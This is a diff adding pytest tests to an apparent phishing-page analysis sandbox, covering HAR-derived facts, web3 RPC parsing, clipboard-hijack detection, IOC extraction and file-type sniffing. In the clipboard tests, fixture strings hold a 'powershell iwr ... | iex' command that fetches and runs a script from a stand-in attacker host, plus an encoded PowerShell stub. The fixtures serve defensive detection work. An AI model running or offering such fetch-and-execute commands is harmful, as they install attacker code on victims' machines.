@@ -12,7 +12,7 @@ import pytest
 
 from sandbox.analysis.domains import BrandRef, lookalike, registrable, skeleton
 from sandbox.analysis.engine import behaviour_hits, evaluate
-from sandbox.analysis.facts import CaptureData, build_facts
+from sandbox.analysis.facts import CaptureData, build_facts, extract_iocs
 from sandbox.analysis.local import builtin_behaviour, evaluate_dir
 from sandbox.analysis.scoring import score
 from sandbox.rules import defaults
@@ -400,3 +400,77 @@ def test_registrable_and_skeleton():
     assert registrable("a.b.example.co.uk") == "example.co.uk"
     assert registrable("10.0.0.1") == "10.0.0.1"
     assert skeleton("paypa1") == skeleton("paypal")
+
+
+# --- new fact derivations (HAR, web3, idp, clipboard A1 fields) -----------------------
+
+
+def _capd(final_url, **result):
+    from sandbox.analysis.facts import CaptureData
+
+    base = {"url": final_url, "final_url": final_url, "pages": [], "redirects": [],
+            "navigations": [{"url": final_url}], "hosts": {}}  # noqa: E501
+    return CaptureData(result={**base, **result}, brands=BRANDS)
+
+
+def _harreq(url, method="GET", post="", body="", set_cookie=()):
+    return {
+        "request": {"method": method, "url": url, "headers": [],
+                    "postData": {"text": post} if post else {}},  # noqa: E501
+        "response": {"status": 200, "content": {"text": body},
+                     "headers": [{"name": "set-cookie", "value": c} for c in set_cookie]},  # noqa: E501
+    }
+
+
+def test_facts_backward_compatible_with_old_capture():
+    """A capture missing every new artifact yields neutral facts, never a crash."""
+    facts = build_facts(_capd("https://plain.example/"))
+    assert facts["exfil"]["telegram_count"] == 0
+    assert facts["idp"]["ms_clone_pages"] == 0
+    assert facts["web3"]["rpc_call_count"] == 0
+    assert facts["websocket"]["count"] == 0
+    assert facts["evasion"]["devtools_blocked"] == 0
+    assert facts["final"]["ipfs"] is None
+    assert facts["lure"]["fake_captcha"] is False
+
+
+def test_web3_rpc_fact_parses_batch_and_method():
+    data = _capd("https://x.example/")
+    body = '[{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0xABc"}]},' \
+           '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x1"]}]'
+    data.har_entries = [_harreq("https://rpc.example/", "POST", post=body)]
+    web3 = build_facts(data)["web3"]
+    assert web3["rpc_call_count"] == 2
+    assert "0xabc" in web3["contract_addresses"]
+
+
+def test_clipboard_no_gesture_and_overwrite_facts():
+    data = _capd(
+        "https://x.example/",
+        clipboard=[
+            {"api": "navigator.clipboard.writeText", "text": "powershell -enc " + "A" * 60,
+             "user_activation": False},  # noqa: E501
+            {"api": "navigator.clipboard.writeText", "text": "   ", "user_activation": True},
+        ],
+    )
+    clip = build_facts(data)["clipboard"]
+    assert clip["no_gesture_writes"] == 1
+    assert clip["overwritten_command"] == 1
+
+
+def test_clipboard_ioc_extraction_from_command():
+    data = _capd(
+        "https://x.example/",
+        clipboard=[{"api": "x", "text": "powershell iwr https://evil.example/a.ps1 | iex"}],
+    )
+    iocs = extract_iocs(data, build_facts(data))
+    assert "https://evil.example/a.ps1" in iocs["urls"]
+    assert "evil.example" in iocs["domains"]
+
+
+def test_magic_typing_detects_iso_in_download_head():
+    from sandbox.analysis.facts import _magic_type
+
+    head = b"\x00" * 0x8001 + b"CD001"
+    assert _magic_type(head) == "iso"
+    assert _magic_type(b"MSCF\x00") == "cab"
